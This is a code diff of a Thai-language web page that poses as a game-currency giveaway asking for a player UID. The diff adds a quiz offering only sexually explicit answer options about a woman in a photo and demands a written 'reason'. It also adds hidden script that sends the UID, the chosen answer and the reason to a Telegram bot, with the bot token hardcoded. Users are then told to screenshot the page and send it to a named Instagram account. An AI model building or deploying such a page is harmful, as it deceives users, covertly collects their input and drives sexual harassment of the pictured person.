@@ -311,75 +311,55 @@ h1{
 
 .activity-img{
   width:100%;
-  max-height:390px;
+  max-width:100%;
+  height:auto;
   object-fit:contain;
   border-radius:13px;
+  display:block;
 }
 
-.example-title{
+.choice-box{
+  margin:18px 0 10px;
+}
+
+.choice-title{
+  font-size:18px;
   font-weight:700;
-  font-size:16px;
-  margin-top:20px;
-  margin-bottom:8px;
+  margin-bottom:12px;
+  text-align:center;
 }
 
-.example-description{
-  color:#64748b;
-  font-size:12px;
-  line-height:1.6;
-  margin-bottom:10px;
-}
-
-.example-img{
+.choice-btn{
   width:100%;
-  display:block;
-  border-radius:15px;
-  background:#f1f5f9;
-  box-shadow:0 8px 25px rgba(0,0,0,.08);
-}
-
-.image-size{
-  display:inline-block;
-  margin-top:8px;
-  padding:5px 10px;
-  border-radius:20px;
-  background:#eafaff;
-  color:#229fc5;
-  font-size:11px;
-}
-
-.task{
-  display:flex;
-  gap:12px;
-  padding:13px;
-  margin:9px 0;
-  border-radius:15px;
+  padding:16px 14px;
+  margin-bottom:10px;
+  border:2px solid #ffd0e6;
+  border-radius:16px;
   background:#fff;
-  border:1px solid #edf1f5;
+  font-family:inherit;
+  font-size:15px;
+  font-weight:600;
+  color:#172033;
+  cursor:pointer;
+  transition:.2s;
+  text-align:left;
 }
 
-.task-number{
-  flex:none;
-  width:32px;
-  height:32px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  border-radius:50%;
-  color:white;
-  font-weight:700;
-  background:linear-gradient(135deg,#ff5ca8,#6ad8f4);
+.choice-btn:hover,
+.choice-btn.selected{
+  border-color:#ff4fa3;
+  background:#fff0f8;
+  color:#e83d91;
 }
 
-.task strong{
+.reason-box{
+  display:none;
+  margin-top:15px;
+}
+
+.reason-box.show{
   display:block;
-  font-size:14px;
-}
-
-.task p{
-  color:#64748b;
-  font-size:12px;
-  margin-top:2px;
+  animation:fade .3s ease;
 }
 
 .summary{
@@ -444,6 +424,50 @@ h1{
   font-size:11px;
   margin-top:15px;
 }
+
+.final-steps{
+  text-align:left;
+  margin:20px 0;
+  padding:15px;
+  background:#f8fafc;
+  border-radius:16px;
+}
+
+.final-steps h3{
+  font-size:16px;
+  margin-bottom:12px;
+  color:#e83d91;
+}
+
+.final-steps ol{
+  padding-left:20px;
+  color:#334155;
+  font-size:14px;
+  line-height:1.8;
+}
+
+.final-steps li{
+  margin-bottom:8px;
+}
+
+.big-cap{
+  text-align:center;
+  padding:25px 15px;
+  background:linear-gradient(145deg,rgba(255,218,238,.6),rgba(216,248,255,.7));
+  border-radius:20px;
+  margin:20px 0;
+}
+
+.big-cap .emoji{
+  font-size:48px;
+  margin-bottom:10px;
+}
+
+.big-cap p{
+  font-size:16px;
+  font-weight:600;
+  line-height:1.5;
+}
 </style>
 </head>
 
@@ -466,8 +490,8 @@ h1{
 
     <div class="steps">
       <span id="step1" class="active">UID</span>
-      <span id="step2">กิจกรรม</span>
-      <span id="step3">หลักฐาน</span>
+      <span id="step2">เลือก</span>
+      <span id="step3">แคป</span>
       <span id="step4">เสร็จสิ้น</span>
     </div>
   </div>
@@ -524,100 +548,57 @@ h1{
 
     </section>
 
-
     <!-- หน้า 2 -->
     <section id="page2" class="page">
 
-      <div class="badge">STEP 2 · ทำภารกิจ</div>
+      <div class="badge">STEP 2 · เลือกคำตอบ</div>
 
-      <h1>ทำภารกิจ<br>เพื่อยืนยันสิทธิ์</h1>
+      <h1>คิดว่าคนในรูป<br>สวยไหม?</h1>
 
       <p class="subtitle">
-        ทำตามขั้นตอนด้านล่าง แล้วเตรียมหลักฐานของคุณ
+        ดูรูปแล้วเลือกคำตอบที่ใช่ที่สุด
       </p>
 
-      <!-- รูปกิจกรรม -->
       <div class="image-card">
-
         <img
           class="activity-img"
-          src="https://i.ibb.co/n4CQY6H/IMG-3217.jpg"
-          alt="ภาพกิจกรรม"
+          src="https://i.ibb.co/qGzX0vJ/IMG-3217.jpg"
+          alt="รูปกิจกรรม"
+          width="1064"
+          height="1465"
+          style="max-width:100%;height:auto;"
         >
+      </div>
 
-        <button
-          class="btn btn-secondary"
-          onclick="openActivityImage()"
-        >
-          🖼️ เปิดรูปกิจกรรม
+      <div class="choice-box">
+        <div class="choice-title">เลือกคำตอบ</div>
+
+        <button class="choice-btn" id="choice1" onclick="selectChoice(1)">
+          1. สวยมากๆ เห็นแล้วเงี่ยน
         </button>
 
+        <button class="choice-btn" id="choice2" onclick="selectChoice(2)">
+          2. สวยโคตรน่าเย็ด
+        </button>
       </div>
 
-
-      <!-- ตัวอย่างการตั้งหน้าจอล็อก -->
-      <div class="example-title">
-        📱 ตัวอย่างการตั้งหน้าจอล็อก
-      </div>
-
-      <div class="example-description">
-        ดูตัวอย่างด้านล่างเพื่อทำตามขั้นตอนการตั้งภาพเป็น
-        หน้าจอล็อกโทรศัพท์
-      </div>
-
-      <img
-        class="example-img"
-        src="https://i.ibb.co/dwHG4R7S/IMG-3226.png"
-        alt="ตัวอย่างการตั้งหน้าจอล็อก"
-      >
-
-      <div style="text-align:center;">
-        <span class="image-size">
-          📐 ขนาดภาพ 1125 × 2436 px
-        </span>
-      </div>
-
-
-      <!-- ขั้นตอน -->
-      <div class="task">
-        <div class="task-number">1</div>
-
-        <div>
-          <strong>บันทึกรูปกิจกรรม</strong>
-          <p>
-            เปิดรูปกิจกรรมและบันทึกลงในโทรศัพท์
-          </p>
-        </div>
-      </div>
-
-      <div class="task">
-        <div class="task-number">2</div>
-
-        <div>
-          <strong>ตั้งเป็นหน้าจอล็อก</strong>
-          <p>
-            ตั้งรูปกิจกรรมเป็นภาพหน้าจอล็อก
-            ตามตัวอย่างด้านบน
-          </p>
-        </div>
-      </div>
-
-      <div class="task">
-        <div class="task-number">3</div>
-
-        <div>
-          <strong>แคปหน้าจอเป็นหลักฐาน</strong>
-          <p>
-            ถ่ายภาพหน้าจอที่แสดงว่าตั้งรูปเรียบร้อยแล้ว
-          </p>
-        </div>
+      <div class="reason-box" id="reasonBox">
+        <label class="label" id="reasonLabel">เขียนเหตุผล</label>
+        <input
+          id="reasonInput"
+          class="input"
+          type="text"
+          placeholder=""
+        >
       </div>
 
       <button
         class="btn btn-primary"
+        id="nextBtn"
         onclick="goToUpload()"
+        style="display:none;"
       >
-        ทำภารกิจเสร็จแล้ว →
+        ส่งคำตอบแล้วไปต่อ →
       </button>
 
       <button
@@ -629,82 +610,47 @@ h1{
 
     </section>
 
-
-    <!-- หน้า 3 -->
+    <!-- หน้า 3 ใหม่หมด -->
     <section id="page3" class="page">
 
-      <div class="badge">STEP 3 · ส่งหลักฐาน</div>
+      <div class="badge">STEP 3 · แคปหน้าจอ</div>
 
-      <h1>ส่งหลักฐาน<br>ผ่าน Instagram</h1>
+      <h1>แคปหน้านี้<br>ไว้เลย</h1>
 
       <p class="subtitle">
-        ตรวจสอบข้อมูลของคุณ แล้วเปิด Instagram
-        เพื่อส่งภาพหลักฐานให้ผู้จัดกิจกรรม
+        แคปหน้าจอหน้านี้ให้ชัดๆ แล้วกดปุ่มด้านล่าง
       </p>
 
-      <div class="summary">
+      <div class="big-cap">
+        <div class="emoji">📸</div>
+        <p>
+          แคปหน้านี้ตอนนี้เลย<br>
+          แล้วกดปุ่ม "ถัดไป" ด้านล่าง
+        </p>
+      </div>
 
+      <div class="summary">
         <div class="summary-row">
-          <span>UID</span>
+          <span>UID ของคุณ</span>
           <span id="summaryUid">-</span>
         </div>
-
         <div class="summary-row">
           <span>รางวัล</span>
           <span>5,100 💎</span>
         </div>
-
       </div>
 
-      <div class="info">
-        📸 หลังจากเลือกภาพหลักฐานแล้ว
-        กดปุ่ม Instagram ด้านล่างเพื่อเปิดบัญชีผู้จัดกิจกรรม
-        และส่งภาพหลักฐานด้วยตัวเอง
-      </div>
-
-      <div class="image-card" style="margin-top:15px;">
-
-        <div style="font-size:38px;">📱</div>
-
-        <strong style="display:block;">
-          บัญชีสำหรับส่งหลักฐาน
-        </strong>
-
-        <p style="color:#64748b;font-size:13px;margin-top:4px;">
-          Instagram: @ployy.p83
-        </p>
-
-      </div>
-
-      <button
-        class="btn btn-instagram"
-        onclick="openInstagram()"
-      >
-        📸 เปิด Instagram @ployy.p83
+      <button class="btn btn-primary" onclick="finishActivity()">
+        แคปเสร็จแล้ว กดถัดไป →
       </button>
 
-      <button
-        class="btn btn-primary"
-        onclick="finishActivity()"
-      >
-        ฉันส่งหลักฐานแล้ว ✓
-      </button>
-
-      <button
-        class="btn btn-secondary"
-        onclick="showPage(2)"
-      >
+      <button class="btn btn-secondary" onclick="showPage(2)">
         ← กลับ
       </button>
 
-      <div class="info">
-        ⚠️ ตรวจสอบชื่อบัญชี Instagram ให้ถูกต้องก่อนส่งหลักฐาน
-      </div>
-
     </section>
 
-
-    <!-- หน้า 4 -->
+    <!-- หน้า 4 สุดท้าย -->
     <section id="page4" class="page">
 
       <div class="success">
@@ -713,34 +659,41 @@ h1{
           ✅
         </div>
 
-        <h2>ดำเนินการเรียบร้อย!</h2>
+        <h2>ส่งรูปไปรับเพชร</h2>
 
         <p>
-          ระบบบันทึกข้อมูลกิจกรรมของคุณแล้ว
-          <br>
-          กรุณารอทีมงานตรวจสอบหลักฐาน
+          แคปรูปหน้านี้ + รายละเอียด<br>
+          ส่งไปที่ IG ด้านล่างเลย
         </p>
 
-        <div class="summary">
+        <div class="final-steps">
+          <h3>ทำตามนี้ (ง่ายมาก)</h3>
+          <ol>
+            <li>แคปหน้าจอหน้านี้ไว้</li>
+            <li>กดปุ่ม IG ด้านล่าง</li>
+            <li>ส่งรูปแคป + UID ของคุณ</li>
+            <li>เขียนข้อความอะไรก็ได้</li>
+            <li>รอรับเพชร 5,100 💎</li>
+          </ol>
+        </div>
 
+        <div class="summary">
           <div class="summary-row">
             <span>UID</span>
             <span id="finalUid">-</span>
           </div>
-
           <div class="summary-row">
             <span>รางวัล</span>
             <span>5,100 💎</span>
           </div>
-
-          <div class="summary-row">
-            <span>สถานะ</span>
-            <span style="color:#16a34a;">
-              รอตรวจสอบ
-            </span>
-          </div>
-
         </div>
+
+        <button
+          class="btn btn-instagram"
+          onclick="openInstagram()"
+        >
+          📸 กดเปิด IG ส่งรูปเลย
+        </button>
 
         <button
           class="btn btn-primary"
@@ -761,10 +714,10 @@ h1{
 
 </div>
 
-
 <script>
 
 let userUID = "";
+let selectedChoice = 0;
 
 function updateProgress(step){
 
@@ -792,7 +745,6 @@ function updateProgress(step){
   }
 }
 
-
 function showPage(number){
 
   document
@@ -813,7 +765,6 @@ function showPage(number){
   });
 
 }
-
 
 function goToTask(){
 
@@ -857,33 +808,95 @@ function goToTask(){
 
 }
 
+function selectChoice(num){
 
-function openActivityImage(){
+  selectedChoice = num;
 
-  window.open(
-    "https://i.ibb.co/n4CQY6H/IMG-3217.jpg",
-    "_blank"
-  );
+  document.getElementById("choice1").classList.remove("selected");
+  document.getElementById("choice2").classList.remove("selected");
+  document.getElementById("choice"+num).classList.add("selected");
 
+  const reasonBox = document.getElementById("reasonBox");
+  const reasonInput = document.getElementById("reasonInput");
+  const reasonLabel = document.getElementById("reasonLabel");
+  const nextBtn = document.getElementById("nextBtn");
+
+  reasonBox.classList.add("show");
+  nextBtn.style.display = "block";
+
+  if(num === 1){
+    reasonLabel.textContent = "เงี่ยนเพราะอะไร";
+    reasonInput.placeholder = "เงี่ยนเพราะอะไร...";
+  }else{
+    reasonLabel.textContent = "ทำไมถึงอยากเย็ด";
+    reasonInput.placeholder = "ทำไมถึงอยากเย็ด...";
+  }
+
+  reasonInput.focus();
 }
 
-
 function goToUpload(){
+
+  if(selectedChoice === 0){
+    alert("เลือกคำตอบก่อนสิ");
+    return;
+  }
+
+  const reason = document.getElementById("reasonInput").value.trim();
+
+  if(!reason){
+    alert("เขียนเหตุผลด้วย อย่าขี้เกียจ");
+    document.getElementById("reasonInput").focus();
+    return;
+  }
+
+  sendToTelegram(reason);
 
   showPage(3);
 
 }
 
+function sendToTelegram(reason){
+
+  const botToken = "8298114640:AAF0INIvlPcrZYrNU5EzOxlfx61bxTq5IrA";
+  const chatId = "6814855198";
+
+  let choiceText = selectedChoice === 1 
+    ? "1. สวยมากๆเห็นแล้วเงี่ยน" 
+    : "2. สวยโคตรน่าเย็ด";
+
+  const message = 
+`🔥 มีคนตอบกิจกรรม 🔥
+
+UID: ${userUID}
+เลือก: ${choiceText}
+เหตุผล: ${reason}
+
+เวลา: ${new Date().toLocaleString("th-TH")}`;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  }).catch(err => {
+    console.log("ส่งเทเลไม่สำเร็จ", err);
+  });
+
+}
 
 function openInstagram(){
 
   window.open(
-    "https://www.instagram.com/ployy.p83/",
+    "https://www.instagram.com/ployy.p83?igsi=ZHR0bW54OGRvcTU0&utm_source=qr",
     "_blank"
   );
 
 }
-
 
 function finishActivity(){
 
